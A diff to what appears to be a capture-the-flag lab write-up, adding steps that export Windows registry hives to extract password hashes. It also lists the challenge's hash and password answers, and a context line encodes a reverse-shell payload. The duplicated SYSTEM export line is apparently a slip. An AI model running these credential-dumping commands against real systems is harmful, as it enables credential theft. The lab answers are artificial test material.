@@ -572,6 +572,32 @@ iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
 
 ![](givingintosocatrelayage.png)
 
+While crying about why mimikatz does not work I just copy the SYSTEM and SAM hives and downloaded them out.
+![](nomimikatznoworries.png)
+
+```powershell
+reg export HKLM\SYSTEM SYSTEM.bak
+reg export HKLM\SYSTEM SYSTEM.bak
+```
+
+But secretsdump did not work as something was wrong with the data retry! As I did not have the SECURITY hive which did not want to `robocopy` or `reg export` even though I was administrator
+
+![](iloveruby.png)
+
+What is the Administrator password hash?  
+```
+37db630168e5f82aafa8461e05c6bbd1
+```
+
+What is the NTLM password hash for the user "Thomas"?
+```
+02d90eda8f6b6b06c32d5f207831101f
+```
+
+What is Thomas' password?
+```
+i<3ruby
+```
 ## C2 Choices Diverge...
 
 From this point I will use have already started using Silver instead of PowerShell Empire here are the answers.
